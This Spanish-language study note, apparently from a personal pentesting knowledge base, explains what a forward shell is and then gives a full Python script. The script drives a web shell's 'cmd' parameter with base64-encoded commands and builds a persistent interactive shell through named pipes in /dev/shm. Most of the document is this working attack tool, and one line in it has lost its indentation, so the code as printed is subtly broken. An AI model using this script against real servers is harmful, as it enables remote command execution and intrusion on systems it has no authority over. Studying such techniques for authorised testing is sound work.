____

- Tags: #forward-shell #explotación #enumeración #scripting #redes #ipv4 

___
# Definición 

Una "**Forward Shell**" es una técnica utilizada en ciberseguridad que permite a un atacante ejecutar comandos en una máquina remota a través de una conexión de red. A diferencia de una "[[Reverse Shell]]", donde la máquina víctima se conecta al atacante, en una **Forward Shell**, la máquina atacante envía comandos a la máquina objetivo y recibe las respuestas correspondientes.

Esta técnica puede implementarse de diversas maneras, y una de ellas es mediante el uso de scripts en lenguajes de programación como Python. Dichos scripts utilizan solicitudes [[HTTP]] para la comunicación entre las máquinas y permiten al atacante ejecutar comandos de forma remota.

___
# Ejemplo de Forward Shell en Python:

El siguiente script Python ilustra una implementación básica de una [[Forward Shell]]. Este script utiliza peticiones [[HTTP]] para enviar comandos desde la máquina atacante a la máquina víctima y recibir la salida correspondiente.

```python

#!/usr/bin/python3

import requests, time, threading, pdb, signal, sys
from base64 import b64encode
from random import randrange

class AllTheReads(object):
	def __init__(self, interval=1):
		self.interval = interval
		thread = threading.Thread(target=self.run, args=())
		thread.daemon = True
		thread.start()

	def run(self):
		readoutput = """/bin/cat %s""" % (stdout)
		clearoutput = """echo '' > %s""" % (stdout)
		while True:
			output = RunCmd(readoutput)
			if output:
				RunCmd(clearoutput)
				print(output)
			time.sleep(self.interval)

def RunCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
        	'cmd' : 'echo "%s" | base64 -d | sh' %(cmd)
		}
	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
	return result

def WriteCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
		'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
	}
	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
	return result

def ReadCmd():
        GetOutput = """/bin/cat %s""" % (stdout)
        output = RunCmd(GetOutput)
        return output

def SetupShell():
NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
	try:
		RunCmd(NamedPipes)
	except:
		None
	return None

global stdin, stdout
session = randrange(1000, 9999)
stdin = "/dev/shm/input.%s" % (session)
stdout = "/dev/shm/output.%s" % (session)
erasestdin = """/bin/rm %s""" % (stdin)
erasestdout = """/bin/rm %s""" % (stdout)

SetupShell()

ReadingTheThings = AllTheReads()

def sig_handler(sig, frame):
	print("\n\n[*] Exiting...\n")
	print("[*] Removing files...\n")
	RunCmd(erasestdin)
	RunCmd(erasestdout)
	print("[*] All files have been deleted\n")
	sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)

while True:
	cmd = input("> ")
	WriteCmd(cmd + "\n")
	time.sleep(1.1)

```

